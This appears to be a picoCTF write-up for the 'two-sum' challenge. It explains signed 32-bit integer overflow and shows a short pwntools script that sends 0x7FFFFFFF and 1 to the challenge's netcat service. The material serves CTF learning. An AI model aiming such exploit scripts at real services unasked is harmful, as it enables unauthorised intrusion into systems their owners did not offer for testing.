# two-sum


This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/382) asks us to enter two positive numbers that will produce a negative integer:

```
❯ nc saturn.picoctf.net 52577
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
1 2
You entered 1 and 2
No overflow
```

It is a basic overflow where we have two signed integer, so we need to produce a negative integer from them:


Here an example of an overflow with addition on signed integers.
![alt-text](https://i.imgur.com/T742Xbm.png)


Looking at the source code we have this:

```c
static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}
```

So we know that a b and our result are integers (4bytes).

We can then take the maximum possible positive value for a signed integer `0x7FFFFFFF` and add 1 to overflow:

```py
from pwn import *

a = 0x7FFFFFFF 
b = 1

payload = '{} {}'.format(a, b)
r = remote('saturn.picoctf.net', 52577)

r.recvuntil(b'What two positive numbers can make this possible:')
r.sendline(payload.encode())
r.interactive()
```
